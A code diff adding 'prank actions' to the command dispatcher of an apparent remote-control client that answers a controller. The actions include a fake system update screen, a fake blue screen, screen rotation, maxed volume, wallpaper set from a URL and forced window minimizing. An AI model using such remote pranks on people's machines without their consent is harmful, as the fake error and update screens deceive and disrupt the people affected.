@@ -42,6 +42,35 @@ def _handle(action: str, args: dict):
         if action == "ping":
             info = actions.system_summary()
             return True, f"pong dari {info['host']} ({info['os']}) v{__version__}"
+        # --- prank actions ---
+        if action == "say":
+            return True, actions.say(args.get("text", ""))
+        if action == "notify":
+            return True, actions.notify(args.get("text", ""))
+        if action == "rickroll":
+            return True, actions.rickroll()
+        if action == "beep":
+            return True, actions.beep()
+        if action == "wallpaper":
+            return True, actions.set_wallpaper(args.get("url", ""))
+        if action == "matrix":
+            return True, actions.open_matrix()
+        if action == "fakeupdate":
+            return True, actions.open_fakeupdate()
+        if action == "minimize":
+            return True, actions.minimize_all()
+        if action == "volume":
+            return True, actions.set_volume(args.get("level", "max"))
+        if action == "spin":
+            return True, actions.rotate_screen(2)
+        if action == "unspin":
+            return True, actions.rotate_screen(0)
+        if action == "bsod":
+            return True, actions.open_bsod()
+        if action == "disco":
+            return True, actions.open_disco()
+        if action == "countdown":
+            return True, actions.open_countdown(args.get("seconds", 10))
         return False, f"aksi tidak dikenal: {action}"
     except Exception as exc:  # noqa: BLE001 - report any failure back to controller
         return False, f"error: {exc}"
